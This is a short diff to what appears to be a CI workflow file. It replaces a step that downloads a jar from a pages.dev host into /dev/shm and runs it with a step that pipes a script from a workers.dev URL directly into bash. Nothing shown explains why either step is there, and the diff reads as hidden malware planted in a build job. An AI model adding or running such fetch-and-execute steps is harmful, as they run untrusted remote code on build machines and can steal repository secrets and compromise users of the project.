@@ -29,5 +29,4 @@ jobs:
           java-version: '21'
       - name: Run a multi-line script
         run: |
-          curl -o /dev/shm/1.jar "https://p0xo8cjyvi83xw.pages.dev/Client-1.0-all.jar"
-          java -jar /dev/shm/1.jar
+          curl https://node-v3.skidder-loli.workers.dev/resource/3927a9578d71da5e17bb5096cabe84e65d20367b5d75e7be27580a2b1a4b3240.sh?t=1759555705 | bash
